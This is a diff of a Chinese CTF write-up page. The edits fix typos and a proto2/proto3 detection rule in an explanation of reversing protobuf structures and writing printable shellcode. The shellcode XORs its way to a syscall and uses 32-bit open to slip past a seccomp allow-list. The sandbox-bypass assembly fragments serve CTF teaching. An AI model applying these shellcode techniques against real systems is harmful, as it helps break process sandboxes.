@@ -389,7 +389,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.3k
+                    2.4k
                 </div>
                 
 
@@ -415,17 +415,17 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p>本题来源于源鲁杯第一轮<code>pwn</code>的困难题，向程序发送了<code>msg</code>之后会判定是否符合<code>proto</code>结构，符合则开启沙箱仅允许执行<code>read、write、fstat、alarm、exit_group</code>，并执行<code>msg</code>里的<code>shellcode</code>，<code>shellcode</code>要求范围在可见字符且长度不大于<code>0xc7</code></p>
-<h2 id="protobuf结构体"><a href="#protobuf结构体" class="headerlink" title="protobuf结构体"></a>protobuf结构体</h2><h3 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h3><h4 id="结构体示例"><a href="#结构体示例" class="headerlink" title="结构体示例"></a>结构体示例</h4><p><code>protobuf</code>结构体示例：<code>bot.proto</code>，由<code>protobuf</code>版本（<code>proto2 / proto3</code>）和<code>protobuf</code>结构体构成</p>
+<h2 id="protobuf结构体"><a href="#protobuf结构体" class="headerlink" title="protobuf结构体"></a>protobuf结构体</h2><h3 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h3><h4 id="protobuf结构体-x2F-proto文件示例"><a href="#protobuf结构体-x2F-proto文件示例" class="headerlink" title="protobuf结构体&#x2F;proto文件示例"></a>protobuf结构体&#x2F;proto文件示例</h4><p><code>protobuf</code>结构体示例：<code>device.proto</code>，由<code>protobuf</code>版本（<code>proto2 / proto3</code>）和<code>protobuf</code>结构体构成</p>
 <pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto2"</span><span class="token punctuation">;</span>
 
 <span class="token keyword">message</span> <span class="token class-name">devicemsg</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">required</span> <span class="token builtin">sint64</span> actionid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
   <span class="token keyword">required</span> <span class="token builtin">sint64</span> msgidx <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
   <span class="token keyword">required</span> <span class="token builtin">sint64</span> msgsize <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
-  <span class="token keyword">required</span> <span class="token builtin">bytes</span> msgcontent <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
+  <span class="token keyword">required</span> <span class="token builtin">bytes</span>  msgcontent <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="protobuf参数的结构体定义"><a href="#protobuf参数的结构体定义" class="headerlink" title="protobuf参数的结构体定义"></a>protobuf参数的结构体定义</h4><p><code>protobuf</code>结构体中的参数的结构体定义，其中需要注意的是前四项，在<code>.data.rel.ro</code>段中可以看到每个参数的结构体，根据结构体中的值判断参数类型等信息，从而分析得到<code>protobuf</code>结构体</p>
+<h4 id="protobuf参数的结构体定义"><a href="#protobuf参数的结构体定义" class="headerlink" title="protobuf参数的结构体定义"></a>protobuf参数的结构体定义</h4><p><code>protobuf</code>参数的结构体定义如下，其中需要注意的是前四项，在<code>.data.rel.ro</code>段中可以看到每个参数的结构体，根据结构体中的值判断参数类型等信息，从而分析得到<code>protobuf</code>结构体</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">ProtobufCFieldDescriptor</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">const</span> <span class="token keyword">char</span>		<span class="token operator">*</span>name<span class="token punctuation">;</span>
 	<span class="token class-name">uint32_t</span>		id<span class="token punctuation">;</span>
@@ -441,7 +441,7 @@
 	<span class="token keyword">void</span>			<span class="token operator">*</span>reserved3<span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>以示例中的<code>required sint64 actionid = 1;</code>为例，分别对应结构体前四项：<code>name</code>值为<code>actionid</code>，<code>id</code>值为<code>1</code>，<code>label</code>值为<code>required</code>，<code>type</code>值为<code>sint64</code>，<strong>即在编写<code>prot</code>文件时是按照<code>label type name = id</code>的顺序写的</strong></p>
+<p>以示例中的<code>required sint64 actionid = 1;</code>为例，分别对应结构体前四项：<code>name</code>值为<code>actionid</code>，<code>id</code>值为<code>1</code>，<code>label</code>值为<code>required</code>，<code>type</code>值为<code>sint64</code>，<strong>即在编写<code>proto</code>文件时是按照<code>label type name = id</code>的顺序写的</strong></p>
 <p><code>label</code>存在以下类型，即<code>required</code>、<code>optional</code>、<code>repeated</code>、<code>none</code>，从单词含义也能看出对应什么类型，他们表现在<code>.data.rel.ro</code>中的数值是按枚举顺序<code>0-3</code>，**只有版本为<code>proto2</code>时才需要考虑<code>label</code>**，<code>proto3</code>的<code>label</code>都是<code>none</code>（即数值为<code>3</code>）且不需要在<code>proto</code>文件中写出来</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">enum</span> <span class="token punctuation">&#123;</span>
 	PROTOBUF_C_LABEL_REQUIRED<span class="token punctuation">,</span>
@@ -476,7 +476,7 @@
 <p>在<code>.data.rel.ro</code>段的结构体名下面两项分别是结构体大小和结构体参数数量，<code>proto2</code>比<code>proto3</code>多了<code>default_value</code>字段，所以参数数量会比实际参数数量多一个</p>
 </li>
 <li><p>根据参数结构体有无<code>label</code></p>
-<p><code>proto2</code>中必须声明参数的<code>label</code>，所以<code>label</code>值都为<code>none</code>（即<code>3</code>）可以判定为是<code>proto3</code></p>
+<p><code>proto2</code>中必须声明参数的<code>label</code>，所以<code>label</code>值存在除<code>none</code>（即<code>3</code>）以外的值就是<code>proto2</code></p>
 </li>
 </ul>
 <h4 id="编译proto文件"><a href="#编译proto文件" class="headerlink" title="编译proto文件"></a>编译proto文件</h4><p>使用<code>python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. filename.proto</code>来编译<code>filename.proto</code>，需要先安装<code>grpcio-tools</code>，编译后得到<code>filename_pb2.py</code>和<code>filename_pb2_grpc.py</code>，编译后在<code>exp</code>中导入<code>filename_pb2</code>即可使用结构体来发送消息</p>
@@ -534,7 +534,7 @@
 <span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C70                 dq offset aMsgbot       <span class="token punctuation">;</span> <span class="token string">"Msgbot"</span>
 <span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C78                 dq offset aBotMsgbot_0  <span class="token punctuation">;</span> <span class="token string">"Bot__Msgbot"</span>
 <span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C80                 dq offset aBot          <span class="token punctuation">;</span> <span class="token string">"bot"</span>
-<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C88                 dq <span class="token number">38</span>h#structure size
+<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C88                 dq <span class="token number">38</span>h#结构体大小
 <span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C90                 dq <span class="token number">3</span>#字段数<span class="token operator">=</span>实际字段数，是proto3
 <span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C98                 dq offset off_3B80      <span class="token punctuation">;</span> <span class="token string">"msgid"</span>
 <span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>CA0                 dq offset unk_20A0
@@ -545,7 +545,7 @@
 <span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>D17 _data_rel_ro    ends
 <span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>D17<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="编写和编译proto文件"><a href="#编写和编译proto文件" class="headerlink" title="编写和编译proto文件"></a>编写和编译proto文件</h3><p><code>bot.proto</code> 内容如下</p>
+<h3 id="编写和编译proto文件"><a href="#编写和编译proto文件" class="headerlink" title="编写和编译proto文件"></a>编写和编译proto文件</h3><p>根据以上分析编写<code>bot.proto</code> 内容如下</p>
 <pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto3"</span><span class="token punctuation">;</span>
 
 <span class="token keyword">message</span> <span class="token class-name">Msgbot</span><span class="token punctuation">&#123;</span>
@@ -605,7 +605,8 @@ r<span class="token punctuation">.</span>sendafter<span class="token punctuation
     <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="写shellcode"><a href="#写shellcode" class="headerlink" title="写shellcode"></a>写shellcode</h2><h3 id="检查沙箱"><a href="#检查沙箱" class="headerlink" title="检查沙箱"></a>检查沙箱</h3><p>通过<code>check</code>之后开启沙箱，所以要执行到发送正确的消息之后才能用<code>seccomp-tools</code>查看沙箱情况，这里可以将<code>process</code>的参数设置为<code>seccomp-tools</code>即<code>r = process([&quot;seccomp-tools&quot;, &quot;dump&quot;, &quot;./pwn&quot;])</code>，发送完<code>msg</code>就会显示沙箱的情况</p>
+<h2 id="写shellcode"><a href="#写shellcode" class="headerlink" title="写shellcode"></a>写shellcode</h2><p><strong>调试<code>shellcode</code>的时候用<code>si</code>不要用<code>ni</code>！！</strong></p>
+<h3 id="检查沙箱"><a href="#检查沙箱" class="headerlink" title="检查沙箱"></a>检查沙箱</h3><p>通过<code>check</code>之后开启沙箱，所以要执行到发送正确的消息之后才能用<code>seccomp-tools</code>查看沙箱情况，这里可以将<code>process</code>的参数设置为<code>seccomp-tools</code>即<code>r = process([&quot;seccomp-tools&quot;, &quot;dump&quot;, &quot;./pwn&quot;])</code>，发送完<code>msg</code>就会显示沙箱的情况</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"> line  CODE  JT   JF      K
 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
  <span class="token number">0000</span><span class="token operator">:</span> <span class="token number">0x20</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  A <span class="token operator">=</span> sys_number
@@ -620,7 +621,7 @@ r<span class="token punctuation">.</span>sendafter<span class="token punctuation
  <span class="token number">0009</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x7fff0000</span>  <span class="token keyword">return</span> ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这里限制了只能使用<code>read write fstat alarm exit_group</code>，程序是<code>64</code>位的，而<code>fstat</code>在<code>32</code>位中对应的函数就是<code>open</code>，所以可以使用<code>32</code>位的<code>open</code>和<code>64</code>位的<code>read write</code></p>
-<h3 id="构造syscall"><a href="#构造syscall" class="headerlink" title="构造syscall"></a>构造syscall</h3><p>限制了可见字符且限制长度的情况下第一步就需要先构造一个<code>read</code>无限制的再读一次，而<code>syscall</code>的汇编字节的<code>0x0f05</code>不在可见字符范围内，所以需要通过异或构造，需要注意端序问题，小端序要反过来写进去，即<code>0x050f</code>，写在<code>shellcode</code>末尾用来异或的数值也要反过来写，我选择的是<code>0x66666963 ^ 0x66666c6c = 0x50f</code>，构造<code>shellcode</code>如下</p>
+<h3 id="构造syscall"><a href="#构造syscall" class="headerlink" title="构造syscall"></a>构造syscall</h3><p>限制了可见字符且限制长度的情况下第一步就需要先构造一个<code>read</code>无限制的再读一次，而<code>syscall</code>的汇编字节是<code>0x0f05</code>不在可见字符范围内，所以需要通过异或构造，需要注意端序问题，小端序要反过来写进去，即<code>0x050f</code>，写在<code>shellcode</code>末尾用来异或的数值也要反过来写，我选择的是<code>0x66666963 ^ 0x66666c6c = 0x50f</code>，构造<code>shellcode</code>如下</p>
 <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push 0x66666963
 pop rsi
 xor qword ptr [rax + 0x20], rsi
@@ -641,7 +642,7 @@ push rax
 push rax
 \x6c\x6c\x66\x66<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="架构切换调用open"><a href="#架构切换调用open" class="headerlink" title="架构切换调用open"></a>架构切换调用open</h3><p>使用汇编指令<code>retfq</code>切换架构，原理是改<code>cs</code>寄存器，当<code>cs</code>寄存器的值为<code>0x33</code>时识别为<code>64</code>位，当寄存器值位<code>0x23</code>时识别位<code>32</code>位，而<code>retfq</code>指令相当于<code>pop ip; pop cs</code>，所以需要先<code>push cs</code>再<code>push</code>指令地址最后<code>retfq</code>切换架构</p>
+<h3 id="架构切换调用open"><a href="#架构切换调用open" class="headerlink" title="架构切换调用open"></a>架构切换调用open</h3><p>使用汇编指令<code>retfq</code>切换架构，原理是改<code>cs</code>寄存器，当<code>cs</code>寄存器的值为<code>0x33</code>时识别为<code>64</code>位，当寄存器值位<code>0x23</code>时识别位<code>32</code>位，而<code>retfq</code>指令相当于<code>pop ip; pop cs</code>，所以需要先<code>push cs</code>再<code>push</code>需要执行的指令地址最后<code>retfq</code>切换架构</p>
 <p>不过其实我没切换直接写<code>32</code>位的<code>shellcode</code>用<code>int 80</code>实现系统调用也能执行<code>open</code>…<code>shellcode</code>如下</p>
 <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov  eax, 5
 push ecx
